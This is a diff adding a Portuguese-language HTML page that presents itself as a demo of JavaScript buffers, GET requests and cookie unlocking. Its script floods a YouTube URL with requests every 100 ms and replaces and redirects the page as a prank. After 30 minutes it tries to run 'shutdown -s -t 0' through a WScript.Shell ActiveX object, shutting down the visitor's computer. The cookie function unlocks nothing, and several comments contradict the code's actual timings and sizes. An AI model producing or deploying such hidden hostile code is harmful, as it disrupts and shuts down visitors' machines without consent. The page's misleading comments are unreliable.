@@ -1,0 +1,108 @@
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Buffer e Requisições GET em JavaScript</title>
+</head>
+<h1>Buffer de 32 bytes e Requisições GET<br>E desbloqueando cookies.</h1>
+<body>
+    <script>
+        // Criando um ArrayBuffer de 128 bytes
+        const buffer = new ArrayBuffer(128);
+        const uint8Array = new Uint8Array(buffer);
+
+        // Preenchendo o buffer com alguns valores iniciais
+        for (let i = 0; i < uint8Array.length; i++) {
+            uint8Array[i] = i + 1;
+        }
+
+        // Função para multiplicar os valores do buffer por um fator
+        function multiplyBuffer() {
+            for (let i = 0; i < uint8Array.length; i++) {
+                uint8Array[i] *= 2;
+            }
+            console.log('Valores do buffer multiplicados por 2:', uint8Array);
+        }
+
+        // Função para fazer requisições GET para o site fornecido
+        function makeGetRequest() {
+            const url = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+            fetch(url)
+                .then(response => {
+                    if (response.ok) {
+                        console.log('Requisição GET bem-sucedida para:', url);
+                    } else {
+                        console.error('Erro na requisição GET para:', url);
+                    }
+                })
+                .catch(error => {
+                    console.error('Erro na requisição GET para:', url, error);
+                });
+        }
+
+        // Executar a multiplicação do buffer a cada 5 segundos
+        setInterval(multiplyBuffer, 500);
+
+        // Fazer requisições GET para o site a cada 10 segundos
+        setInterval(makeGetRequest, 100);
+        function desbloquearCookies() {
+    // Verificar se os cookies estão bloqueados
+    if (navigator.cookieEnabled) {
+        alert("Os cookies já estão desbloqueados.");
+    } else {
+        // Tentar definir um cookie de teste
+        document.cookie = "testCookie=1";
+
+        // Verificar se o cookie foi definido corretamente
+        if (document.cookie.indexOf("testCookie") != -1) {
+            // Remover o cookie de teste
+            document.cookie = "testCookie=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
+
+            alert("Os cookies foram desbloqueados com sucesso.");
+        } else {
+            alert("Os cookies estão bloqueados. Por favor, habilite os cookies em seu navegador.");
+        }
+    }
+}
+function brincadeiraDivertida() {
+  // Exibir uma mensagem divertida
+  alert("Ops! Parece que algo deu errado. Mas não se preocupe, foi só uma brincadeira educativa!");
+
+  // Alterar o estilo da página para algo engraçado
+  document.body.style.backgroundColor = "pink";
+  document.body.style.fontSize = "36px";
+  document.body.style.fontFamily = "Comic Sans MS";
+  document.body.innerHTML = "<h1>Oops! Algo deu errado!</h1><p>Isso foi apenas uma brincadeira educativa. Aproveite o resto do seu dia!</p>";
+
+  // Redirecionar para um site engraçado
+  window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+}
+
+// Chamar a função após um tempo definido (por exemplo, 10 segundos)
+setTimeout(brincadeiraDivertida, 10000);
+function desligarComputador() {
+  // Cria um objeto ActiveXObject para acessar o shell do Windows
+  var shell = new ActiveXObject("WScript.Shell");
+  // Executa o comando de desligamento do Windows
+  shell.run("shutdown -s -t 0");
+}
+// Chama a função após um tempo definido (por exemplo, 30 minutos)
+setTimeout(desligarComputador, 30 * 60 * 1000);
+
+    </script>
+</body>
+<pre>
+https://mc.yandex.com/
+link secreto russia 
+</pre>
+</html>
+
+
